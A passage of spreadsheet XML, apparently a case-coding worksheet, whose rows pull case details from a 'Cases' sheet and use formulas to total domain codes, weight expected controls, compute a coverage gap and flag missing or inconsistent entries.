        <f>IF(AI76="","",IF(AI76=0,"No domain coded 1; ","")&amp;IF(M76="","Primary domain missing; ",IF(IFERROR(INDEX(E76:L76,1,M76),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N76:AG76)&lt;&gt;AJ76,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH76="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN76" s="13">
        <f>IF(AND(AI76&lt;&gt;"",AM76=""),1,0)</f>
        <v/>
      </c>
      <c r="AO76" s="14" t="n"/>
    </row>
    <row r="77">
      <c r="A77" s="11">
        <f>Cases!A77</f>
        <v/>
      </c>
      <c r="B77" s="11">
        <f>Cases!B77</f>
        <v/>
      </c>
      <c r="C77" s="11">
        <f>Cases!C77</f>
        <v/>
      </c>
      <c r="D77" s="11">
        <f>IF(Cases!F77="",LEFT(Cases!G77,120),Cases!F77)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E77:L77)=0,"",SUM(E77:L77))</f>
        <v/>
      </c>
      <c r="AJ77" s="13">
        <f>IF(AI77="","",N(E77)*3+N(F77)*2+N(G77)*2+N(H77)*2+N(I77)*2+N(J77)*3+N(K77)*3+N(L77)*3)</f>
        <v/>
      </c>
      <c r="AK77" s="13">
        <f>IF(AI77="","",COUNTIF(N77:AG77,1))</f>
        <v/>
      </c>
      <c r="AL77" s="13">
        <f>IF(OR(AJ77="",AJ77=0),"",ROUND(100*(AJ77-AK77)/AJ77,1))</f>
        <v/>
      </c>
      <c r="AM77" s="11">
        <f>IF(AI77="","",IF(AI77=0,"No domain coded 1; ","")&amp;IF(M77="","Primary domain missing; ",IF(IFERROR(INDEX(E77:L77,1,M77),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N77:AG77)&lt;&gt;AJ77,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH77="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN77" s="13">
        <f>IF(AND(AI77&lt;&gt;"",AM77=""),1,0)</f>
        <v/>
      </c>
      <c r="AO77" s="14" t="n"/>
    </row>
    <row r="78">
      <c r="A78" s="11">
        <f>Cases!A78</f>
        <v/>
      </c>
      <c r="B78" s="11">
        <f>Cases!B78</f>
        <v/>
      </c>
      <c r="C78" s="11">
        <f>Cases!C78</f>
        <v/>
      </c>
      <c r="D78" s="11">
        <f>IF(Cases!F78="",LEFT(Cases!G78,120),Cases!F78)</f>
        <v/>
      </c>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12" t="n"/>
      <c r="AI78" s="13">
        <f>IF(COUNT(E78:L78)=0,"",SUM(E78:L78))</f>
        <v/>
      </c>
      <c r="AJ78" s="13">
        <f>IF(AI78="","",N(E78)*3+N(F78)*2+N(G78)*2+N(H78)*2+N(I78)*2+N(J78)*3+N(K78)*3+N(L78)*3)</f>
        <v/>
      </c>
      <c r="AK78" s="13">
        <f>IF(AI78="","",COUNTIF(N78:AG78,1))</f>
        <v/>
      </c>
      <c r="AL78" s="13">
        <f>IF(OR(AJ78="",AJ78=0),"",ROUND(100*(AJ78-AK78)/AJ78,1))</f>
        <v/>
      </c>
      <c r="AM78" s="11">
        <f>IF(AI78="","",IF(AI78=0,"No domain coded 1; ","")&amp;IF(M78="","Primary domain missing; ",IF(IFERROR(INDEX(E78:L78,1,M78),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N78:AG78)&lt;&gt;AJ78,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH78="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN78" s="13">
        <f>IF(AND(AI78&lt;&gt;"",AM78=""),1,0)</f>
        <v/>
      </c>
      <c r="AO78" s="14" t="n"/>
    </row>
    <row r="79">
      <c r="A79" s="11">
        <f>Cases!A79</f>
        <v/>
      </c>
      <c r="B79" s="11">
        <f>Cases!B79</f>
        <v/>
      </c>
      <c r="C79" s="11">
        <f>Cases!C79</f>
        <v/>
      </c>
      <c r="D79" s="11">
        <f>IF(Cases!F79="",LEFT(Cases!G79,120),Cases!F79)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E79:L79)=0,"",SUM(E79:L79))</f>
        <v/>
      </c>
      <c r="AJ79" s="13">
        <f>IF(AI79="","",N(E79)*3+N(F79)*2+N(G79)*2+N(H79)*2+N(I79)*2+N(J79)*3+N(K79)*3+N(L79)*3)</f>
        <v/>
      </c>
      <c r="AK79" s="13">
        <f>IF(AI79="","",COUNTIF(N79:AG79,1))</f>
        <v/>
      </c>
      <c r="AL79" s="13">
        <f>IF(OR(AJ79="",AJ79=0),"",ROUND(100*(AJ79-AK79)/AJ79,1))</f>
        <v/>
      </c>
      <c r="AM79" s="11">
        <f>IF(AI79="","",IF(AI79=0,"No domain coded 1; ","")&amp;IF(M79="","Primary domain missing; ",IF(IFERROR(INDEX(E79:L79,1,M79),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N79:AG79)&lt;&gt;AJ79,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH79="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN79" s="13">
        <f>IF(AND(AI79&lt;&gt;"",AM79=""),1,0)</f>
        <v/>
      </c>
      <c r="AO79" s="14" t="n"/>
    </row>
    <row r="80">
      <c r="A80" s="11">
        <f>Cases!A80</f>
        <v/>
      </c>
      <c r="B80" s="11">
        <f>Cases!B80</f>
        <v/>
      </c>
      <c r="C80" s="11">
        <f>Cases!C80</f>
        <v/>
      </c>
      <c r="D80" s="11">
        <f>IF(Cases!F80="",LEFT(Cases!G80,120),Cases!F80)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E80:L80)=0,"",SUM(E80:L80))</f>
        <v/>
      </c>
      <c r="AJ80" s="13">
        <f>IF(AI80="","",N(E80)*3+N(F80)*2+N(G80)*2+N(H80)*2+N(I80)*2+N(J80)*3+N(K80)*3+N(L80)*3)</f>
        <v/>
      </c>
      <c r="AK80" s="13">
        <f>IF(AI80="","",COUNTIF(N80:AG80,1))</f>
        <v/>
      </c>
      <c r="AL80" s="13">
        <f>IF(OR(AJ80="",AJ80=0),"",ROUND(100*(AJ80-AK80)/AJ80,1))</f>
        <v/>
      </c>
      <c r="AM80" s="11">
        <f>IF(AI80="","",IF(AI80=0,"No domain coded 1; ","")&amp;IF(M80="","Primary domain missing; ",IF(IFERROR(INDEX(E80:L80,1,M80),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N80:AG80)&lt;&gt;AJ80,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH80="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN80" s="13">
        <f>IF(AND(AI80&lt;&gt;"",AM80=""),1,0)</f>
        <v/>
      </c>
      <c r="AO80" s="14" t="n"/>
    </row>
    <row r="81">
      <c r="A81" s="11">
        <f>Cases!A81</f>
        <v/>
      </c>
      <c r="B81" s="11">
        <f>Cases!B81</f>
        <v/>
      </c>
      <c r="C81" s="11">
        <f>Cases!C81</f>
        <v/>
      </c>
      <c r="D81" s="11">
        <f>IF(Cases!F81="",LEFT(Cases!G81,120),Cases!F81)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E81:L81)=0,"",SUM(E81:L81))</f>
        <v/>
      </c>
      <c r="AJ81" s="13">
        <f>IF(AI81="","",N(E81)*3+N(F81)*2+N(G81)*2+N(H81)*2+N(I81)*2+N(J81)*3+N(K81)*3+N(L81)*3)</f>
        <v/>
      </c>
      <c r="AK81" s="13">
        <f>IF(AI81="","",COUNTIF(N81:AG81,1))</f>
        <v/>
      </c>
      <c r="AL81" s="13">
        <f>IF(OR(AJ81="",AJ81=0),"",ROUND(100*(AJ81-AK81)/AJ81,1))</f>
        <v/>
      </c>
      <c r="AM81" s="11">
        <f>IF(AI81="","",IF(AI81=0,"No domain coded 1; ","")&amp;IF(M81="","Primary domain missing; ",IF(IFERROR(INDEX(E81:L81,1,M81),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N81:AG81)&lt;&gt;AJ81,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH81="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN81" s="13">
        <f>IF(AND(AI81&lt;&gt;"",AM81=""),1,0)</f>
        <v/>
      </c>
      <c r="AO81" s="14" t="n"/>
    </row>
    <row r="82">
      <c r="A82" s="11">
        <f>Cases!A82</f>
        <v/>
      </c>
      <c r="B82" s="11">
        <f>Cases!B82</f>
        <v/>
      </c>
      <c r="C82" s="11">
        <f>Cases!C82</f>
        <v/>
      </c>
      <c r="D82" s="11">
        <f>IF(Cases!F82="",LEFT(Cases!G82,120),Cases!F82)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E82:L82)=0,"",SUM(E82:L82))</f>
        <v/>
      </c>
      <c r="AJ82" s="13">
        <f>IF(AI82="","",N(E82)*3+N(F82)*2+N(G82)*2+N(H82)*2+N(I82)*2+N(J82)*3+N(K82)*3+N(L82)*3)</f>
        <v/>
      </c>
      <c r="AK82" s="13">
        <f>IF(AI82="","",COUNTIF(N82:AG82,1))</f>
        <v/>
      </c>
      <c r="AL82" s="13">
        <f>IF(OR(AJ82="",AJ82=0),"",ROUND(100*(AJ82-AK82)/AJ82,1))</f>
        <v/>
      </c>
      <c r="AM82" s="11">
        <f>IF(AI82="","",IF(AI82=0,"No domain coded 1; ","")&amp;IF(M82="","Primary domain missing; ",IF(IFERROR(INDEX(E82:L82,1,M82),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N82:AG82)&lt;&gt;AJ82,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH82="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN82" s="13">
        <f>IF(AND(AI82&lt;&gt;"",AM82=""),1,0)</f>
        <v/>
      </c>
      <c r="AO82" s="14" t="n"/>
    </row>
    <row r="83">
      <c r="A83" s="11">
        <f>Cases!A83</f>
        <v/>
      </c>
      <c r="B83" s="11">
        <f>Cases!B83</f>
        <v/>
      </c>
      <c r="C83" s="11">
        <f>Cases!C83</f>
        <v/>
      </c>
      <c r="D83" s="11">
        <f>IF(Cases!F83="",LEFT(Cases!G83,120),Cases!F83)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E83:L83)=0,"",SUM(E83:L83))</f>
        <v/>
      </c>
      <c r="AJ83" s="13">
        <f>IF(AI83="","",N(E83)*3+N(F83)*2+N(G83)*2+N(H83)*2+N(I83)*2+N(J83)*3+N(K83)*3+N(L83)*3)</f>
        <v/>
      </c>
      <c r="AK83" s="13">
        <f>IF(AI83="","",COUNTIF(N83:AG83,1))</f>
        <v/>
      </c>
      <c r="AL83" s="13">
        <f>IF(OR(AJ83="",AJ83=0),"",ROUND(100*(AJ83-AK83)/AJ83,1))</f>
        <v/>
      </c>
      <c r="AM83" s="11">
        <f>IF(AI83="","",IF(AI83=0,"No domain coded 1; ","")&amp;IF(M83="","Primary domain missing; ",IF(IFERROR(INDEX(E83:L83,1,M83),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N83:AG83)&lt;&gt;AJ83,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH83="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN83" s="13">
        <f>IF(AND(AI83&lt;&gt;"",AM83=""),1,0)</f>
        <v/>
      </c>
      <c r="AO83" s="14" t="n"/>
    </row>
    <row r="84">
      <c r="A84" s="11">
        <f>Cases!A84</f>
        <v/>
      </c>
      <c r="B84" s="11">
        <f>Cases!B84</f>
        <v/>
      </c>
      <c r="C84" s="11">
        <f>Cases!C84</f>
        <v/>
      </c>
      <c r="D84" s="11">
        <f>IF(Cases!F84="",LEFT(Cases!G84,120),Cases!F84)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E84:L84)=0,"",SUM(E84:L84))</f>
        <v/>
      </c>
      <c r="AJ84" s="13">
        <f>IF(AI84="","",N(E84)*3+N(F84)*2+N(G84)*2+N(H84)*2+N(I84)*2+N(J84)*3+N(K84)*3+N(L84)*3)</f>
        <v/>
      </c>
      <c r="AK84" s="13">
        <f>IF(AI84="","",COUNTIF(N84:AG84,1))</f>
        <v/>
      </c>
      <c r="AL84" s="13">
        <f>IF(OR(AJ84="",AJ84=0),"",ROUND(100*(AJ84-AK84)/AJ84,1))</f>
        <v/>
      </c>
      <c r="AM84" s="11">
        <f>IF(AI84="","",IF(AI84=0,"No domain coded 1; ","")&amp;IF(M84="","Primary domain missing; ",IF(IFERROR(INDEX(E84:L84,1,M84),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N84:AG84)&lt;&gt;AJ84,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH84="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN84" s="13">
        <f>IF(AND(AI84&lt;&gt;"",AM84=""),1,0)</f>
        <v/>
      </c>
      <c r="AO84" s="14" t="n"/>
    </row>
    <row r="85">
      <c r="A85" s="11">
        <f>Cases!A85</f>
        <v/>
      </c>
      <c r="B85" s="11">
        <f>Cases!B85</f>
        <v/>
      </c>
      <c r="C85" s="11">
        <f>Cases!C85</f>
        <v/>
      </c>
      <c r="D85" s="11">
        <f>IF(Cases!F85="",LEFT(Cases!G85,120),Cases!F85)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E85:L85)=0,"",SUM(E85:L85))</f>
        <v/>
      </c>
      <c r="AJ85" s="13">
        <f>IF(AI85="","",N(E85)*3+N(F85)*2+N(G85)*2+N(H85)*2+N(I85)*2+N(J85)*3+N(K85)*3+N(L85)*3)</f>
        <v/>
      </c>
      <c r="AK85" s="13">
        <f>IF(AI85="","",COUNTIF(N85:AG85,1))</f>
        <v/>
      </c>
      <c r="AL85" s="13">
        <f>IF(OR(AJ85="",AJ85=0),"",ROUND(100*(AJ85-AK85)/AJ85,1))</f>
        <v/>
      </c>
      <c r="AM85" s="11">
        <f>IF(AI85="","",IF(AI85=0,"No domain coded 1; ","")&amp;IF(M85="","Primary domain missing; ",IF(IFERROR(INDEX(E85:L85,1,M85),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N85:AG85)&lt;&gt;AJ85,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH85="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN85" s="13">
        <f>IF(AND(AI85&lt;&gt;"",AM85=""),1,0)</f>
        <v/>
      </c>
      <c r="AO85" s="14" t="n"/>
    </row>
    <row r="86">
      <c r="A86" s="11">
        <f>Cases!A86</f>
        <v/>
      </c>
      <c r="B86" s="11">
        <f>Cases!B86</f>
        <v/>
      </c>
      <c r="C86" s="11">
        <f>Cases!C86</f>
        <v/>
      </c>
      <c r="D86" s="11">
        <f>IF(Cases!F86="",LEFT(Cases!G86,120),Cases!F86)</f>
        <v/>
      </c>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c r="AH86" s="12" t="n"/>
      <c r="AI86" s="13">
        <f>IF(COUNT(E86:L86)=0,"",SUM(E86:L86))</f>
        <v/>
      </c>
      <c r="AJ86" s="13">
        <f>IF(AI86="","",N(E86)*3+N(F86)*2+N(G86)*2+N(H86)*2+N(I86)*2+N(J86)*3+N(K86)*3+N(L86)*3)</f>
        <v/>
      </c>
      <c r="AK86" s="13">
        <f>IF(AI86="","",COUNTIF(N86:AG86,1))</f>
        <v/>
      </c>
      <c r="AL86" s="13">
        <f>IF(OR(AJ86="",AJ86=0),"",ROUND(100*(AJ86-AK86)/AJ86,1))</f>
        <v/>
      </c>
      <c r="AM86" s="11">
        <f>IF(AI86="","",IF(AI86=0,"No domain coded 1; ","")&amp;IF(M86="","Primary domain missing; ",IF(IFERROR(INDEX(E86:L86,1,M86),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N86:AG86)&lt;&gt;AJ86,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH86="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN86" s="13">
        <f>IF(AND(AI86&lt;&gt;"",AM86=""),1,0)</f>
        <v/>
      </c>
      <c r="AO86" s="14" t="n"/>
    </row>
    <row r="87">
      <c r="A87" s="11">
        <f>Cases!A87</f>
        <v/>
      </c>
      <c r="B87" s="11">
        <f>Cases!B87</f>
        <v/>
      </c>
      <c r="C87" s="11">
        <f>Cases!C87</f>
        <v/>
      </c>
      <c r="D87" s="11">
        <f>IF(Cases!F87="",LEFT(Cases!G87,120),Cases!F87)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E87:L87)=0,"",SUM(E87:L87))</f>
        <v/>
      </c>
      <c r="AJ87" s="13">
        <f>IF(AI87="","",N(E87)*3+N(F87)*2+N(G87)*2+N(H87)*2+N(I87)*2+N(J87)*3+N(K87)*3+N(L87)*3)</f>
        <v/>
      </c>
      <c r="AK87" s="13">
        <f>IF(AI87="","",COUNTIF(N87:AG87,1))</f>
        <v/>
      </c>
      <c r="AL87" s="13">
        <f>IF(OR(AJ87="",AJ87=0),"",ROUND(100*(AJ87-AK87)/AJ87,1))</f>
        <v/>
      </c>
      <c r="AM87" s="11">
        <f>IF(AI87="","",IF(AI87=0,"No domain coded 1; ","")&amp;IF(M87="","Primary domain missing; ",IF(IFERROR(INDEX(E87:L87,1,M87),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N87:AG87)&lt;&gt;AJ87,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH87="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN87" s="13">
        <f>IF(AND(AI87&lt;&gt;"",AM87=""),1,0)</f>
        <v/>
      </c>
      <c r="AO87" s="14" t="n"/>
    </row>
    <row r="88">
      <c r="A88" s="11">
        <f>Cases!A88</f>
        <v/>
      </c>
      <c r="B88" s="11">
        <f>Cases!B88</f>
        <v/>
      </c>
      <c r="C88" s="11">
        <f>Cases!C88</f>
        <v/>
      </c>
      <c r="D88" s="11">
        <f>IF(Cases!F88="",LEFT(Cases!G88,120),Cases!F88)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E88:L88)=0,"",SUM(E88:L88))</f>
        <v/>
      </c>
      <c r="AJ88" s="13">
        <f>IF(AI88="","",N(E88)*3+N(F88)*2+N(G88)*2+N(H88)*2+N(I88)*2+N(J88)*3+N(K88)*3+N(L88)*3)</f>
        <v/>
      </c>
      <c r="AK88" s="13">
        <f>IF(AI88="","",COUNTIF(N88:AG88,1))</f>
        <v/>
      </c>
      <c r="AL88" s="13">
        <f>IF(OR(AJ88="",AJ88=0),"",ROUND(100*(AJ88-AK88)/AJ88,1))</f>
        <v/>
      </c>
      <c r="AM88" s="11">
        <f>IF(AI88="","",IF(AI88=0,"No domain coded 1; ","")&amp;IF(M88="","Primary domain missing; ",IF(IFERROR(INDEX(E88:L88,1,M88),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N88:AG88)&lt;&gt;AJ88,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH88="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN88" s="13">
        <f>IF(AND(AI88&lt;&gt;"",AM88=""),1,0)</f>
        <v/>
      </c>
      <c r="AO88" s="14" t="n"/>
    </row>
    <row r="89">
      <c r="A89" s="11">
        <f>Cases!A89</f>
        <v/>
      </c>
      <c r="B89" s="11">
        <f>Cases!B89</f>
        <v/>
      </c>
      <c r="C89" s="11">
        <f>Cases!C89</f>
        <v/>
      </c>
      <c r="D89" s="11">
        <f>IF(Cases!F89="",LEFT(Cases!G89,120),Cases!F89)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E89:L89)=0,"",SUM(E89:L89))</f>
        <v/>
      </c>
      <c r="AJ89" s="13">
        <f>IF(AI89="","",N(E89)*3+N(F89)*2+N(G89)*2+N(H89)*2+N(I89)*2+N(J89)*3+N(K89)*3+N(L89)*3)</f>
        <v/>
      </c>
      <c r="AK89" s="13">
        <f>IF(AI89="","",COUNTIF(N89:AG89,1))</f>
        <v/>
      </c>
      <c r="AL89" s="13">
        <f>IF(OR(AJ89="",AJ89=0),"",ROUND(100*(AJ89-AK89)/AJ89,1))</f>
        <v/>
      </c>
      <c r="AM89" s="11">
        <f>IF(AI89="","",IF(AI89=0,"No domain coded 1; ","")&amp;IF(M89="","Primary domain missing; ",IF(IFERROR(INDEX(E89:L89,1,M89),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N89:AG89)&lt;&gt;AJ89,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH89="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN89" s="13">
        <f>IF(AND(AI89&lt;&gt;"",AM89=""),1,0)</f>
        <v/>
      </c>
      <c r="AO89" s="14" t="n"/>
    </row>
    <row r="90">
      <c r="A90" s="11">
        <f>Cases!A90</f>
        <v/>
      </c>
      <c r="B90" s="11">
        <f>Cases!B90</f>
        <v/>
      </c>
      <c r="C90" s="11">
        <f>Cases!C90</f>
        <v/>
      </c>
      <c r="D90" s="11">
        <f>IF(Cases!F90="",LEFT(Cases!G90,120),Cases!F90)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E90:L90)=0,"",SUM(E90:L90))</f>
        <v/>
      </c>
      <c r="AJ90" s="13">
        <f>IF(AI90="","",N(E90)*3+N(F90)*2+N(G90)*2+N(H90)*2+N(I90)*2+N(J90)*3+N(K90)*3+N(L90)*3)</f>
        <v/>
      </c>
      <c r="AK90" s="13">
        <f>IF(AI90="","",COUNTIF(N90:AG90,1))</f>
        <v/>
      </c>
      <c r="AL90" s="13">
        <f>IF(OR(AJ90="",AJ90=0),"",ROUND(100*(AJ90-AK90)/AJ90,1))</f>
        <v/>
      </c>
      <c r="AM90" s="11">
        <f>IF(AI90="","",IF(AI90=0,"No domain coded 1; ","")&amp;IF(M90="","Primary domain missing; ",IF(IFERROR(INDEX(E90:L90,1,M90),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N90:AG90)&lt;&gt;AJ90,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH90="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN90" s="13">
        <f>IF(AND(AI90&lt;&gt;"",AM90=""),1,0)</f>
        <v/>
      </c>
      <c r="AO90" s="14" t="n"/>
    </row>
    <row r="91">
      <c r="A91" s="11">
        <f>Cases!A91</f>
        <v/>
      </c>
      <c r="B91" s="11">
        <f>Cases!B91</f>
        <v/>
      </c>
      <c r="C91" s="11">
        <f>Cases!C91</f>
        <v/>
      </c>
      <c r="D91" s="11">
        <f>IF(Cases!F91="",LEFT(Cases!G91,120),Cases!F91)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E91:L91)=0,"",SUM(E91:L91))</f>
        <v/>
      </c>
      <c r="AJ91" s="13">
        <f>IF(AI91="","",N(E91)*3+N(F91)*2+N(G91)*2+N(H91)*2+N(I91)*2+N(J91)*3+N(K91)*3+N(L91)*3)</f>
        <v/>
      </c>
      <c r="AK91" s="13">
        <f>IF(AI91="","",COUNTIF(N91:AG91,1))</f>
        <v/>
      </c>
      <c r="AL91" s="13">
        <f>IF(OR(AJ91="",AJ91=0),"",ROUND(100*(AJ91-AK91)/AJ91,1))</f>
        <v/>
      </c>
      <c r="AM91" s="11">
        <f>IF(AI91="","",IF(AI91=0,"No domain coded 1; ","")&amp;IF(M91="","Primary domain missing; ",IF(IFERROR(INDEX(E91:L91,1,M91),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N91:AG91)&lt;&gt;AJ91,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH91="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN91" s="13">
        <f>IF(AND(AI91&lt;&gt;"",AM91=""),1,0)</f>
        <v/>
      </c>
      <c r="AO91" s="14" t="n"/>
    </row>
    <row r="92">
      <c r="A92" s="11">
        <f>Cases!A92</f>
        <v/>
      </c>
      <c r="B92" s="11">
        <f>Cases!B92</f>
        <v/>
      </c>
      <c r="C92" s="11">
        <f>Cases!C92</f>
        <v/>
      </c>
      <c r="D92" s="11">
        <f>IF(Cases!F92="",LEFT(Cases!G92,120),Cases!F92)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E92:L92)=0,"",SUM(E92:L92))</f>
        <v/>
      </c>
      <c r="AJ92" s="13">
        <f>IF(AI92="","",N(E92)*3+N(F92)*2+N(G92)*2+N(H92)*2+N(I92)*2+N(J92)*3+N(K92)*3+N(L92)*3)</f>
        <v/>
      </c>
      <c r="AK92" s="13">
        <f>IF(AI92="","",COUNTIF(N92:AG92,1))</f>
        <v/>
      </c>
      <c r="AL92" s="13">
        <f>IF(OR(AJ92="",AJ92=0),"",ROUND(100*(AJ92-AK92)/AJ92,1))</f>
        <v/>
      </c>
      <c r="AM92" s="11">
        <f>IF(AI92="","",IF(AI92=0,"No domain coded 1; ","")&amp;IF(M92="","Primary domain missing; ",IF(IFERROR(INDEX(E92:L92,1,M92),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N92:AG92)&lt;&gt;AJ92,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH92="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN92" s="13">
        <f>IF(AND(AI92&lt;&gt;"",AM92=""),1,0)</f>
        <v/>
      </c>
      <c r="AO92" s="14" t="n"/>
    </row>
    <row r="93">
      <c r="A93" s="11">
        <f>Cases!A93</f>
        <v/>
      </c>
      <c r="B93" s="11">
        <f>Cases!B93</f>
        <v/>
      </c>
      <c r="C93" s="11">
        <f>Cases!C93</f>
        <v/>
      </c>
      <c r="D93" s="11">
        <f>IF(Cases!F93="",LEFT(Cases!G93,120),Cases!F93)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E93:L93)=0,"",SUM(E93:L93))</f>
        <v/>
      </c>
      <c r="AJ93" s="13">
        <f>IF(AI93="","",N(E93)*3+N(F93)*2+N(G93)*2+N(H93)*2+N(I93)*2+N(J93)*3+N(K93)*3+N(L93)*3)</f>
        <v/>
      </c>
      <c r="AK93" s="13">
        <f>IF(AI93="","",COUNTIF(N93:AG93,1))</f>
        <v/>
      </c>
      <c r="AL93" s="13">
        <f>IF(OR(AJ93="",AJ93=0),"",ROUND(100*(AJ93-AK93)/AJ93,1))</f>
        <v/>
      </c>
      <c r="AM93" s="11">
        <f>IF(AI93="","",IF(AI93=0,"No domain coded 1; ","")&amp;IF(M93="","Primary domain missing; ",IF(IFERROR(INDEX(E93:L93,1,M93),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N93:AG93)&lt;&gt;AJ93,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH93="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN93" s="13">
        <f>IF(AND(AI93&lt;&gt;"",AM93=""),1,0)</f>
        <v/>
      </c>
      <c r="AO93" s="14" t="n"/>
    </row>
    <row r="94">
      <c r="A94" s="11">
        <f>Cases!A94</f>
        <v/>
      </c>
      <c r="B94" s="11">
        <f>Cases!B94</f>
        <v/>
      </c>
      <c r="C94" s="11">
        <f>Cases!C94</f>
        <v/>
      </c>
      <c r="D94" s="11">
        <f>IF(Cases!F94="",LEFT(Cases!G94,120),Cases!F94)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E94:L94)=0,"",SUM(E94:L94))</f>
        <v/>
      </c>
      <c r="AJ94" s="13">
        <f>IF(AI94="","",N(E94)*3+N(F94)*2+N(G94)*2+N(H94)*2+N(I94)*2+N(J94)*3+N(K94)*3+N(L94)*3)</f>
        <v/>
      </c>
      <c r="AK94" s="13">
        <f>IF(AI94="","",COUNTIF(N94:AG94,1))</f>
        <v/>
      </c>
      <c r="AL94" s="13">
        <f>IF(OR(AJ94="",AJ94=0),"",ROUND(100*(AJ94-AK94)/AJ94,1))</f>
        <v/>
      </c>
      <c r="AM94" s="11">
        <f>IF(AI94="","",IF(AI94=0,"No domain coded 1; ","")&amp;IF(M94="","Primary domain missing; ",IF(IFERROR(INDEX(E94:L94,1,M94),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N94:AG94)&lt;&gt;AJ94,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH94="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN94" s="13">
        <f>IF(AND(AI94&lt;&gt;"",AM94=""),1,0)</f>
        <v/>
      </c>
      <c r="AO94" s="14" t="n"/>
    </row>
    <row r="95">
      <c r="A95" s="11">
        <f>Cases!A95</f>
        <v/>
      </c>
      <c r="B95" s="11">
        <f>Cases!B95</f>
        <v/>
      </c>
      <c r="C95" s="11">
        <f>Cases!C95</f>
        <v/>
      </c>
      <c r="D95" s="11">
        <f>IF(Cases!F95="",LEFT(Cases!G95,120),Cases!F95)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E95:L95)=0,"",SUM(E95:L95))</f>
        <v/>
      </c>
      <c r="AJ95" s="13">
        <f>IF(AI95="","",N(E95)*3+N(F95)*2+N(G95)*2+N(H95)*2+N(I95)*2+N(J95)*3+N(K95)*3+N(L95)*3)</f>
        <v/>
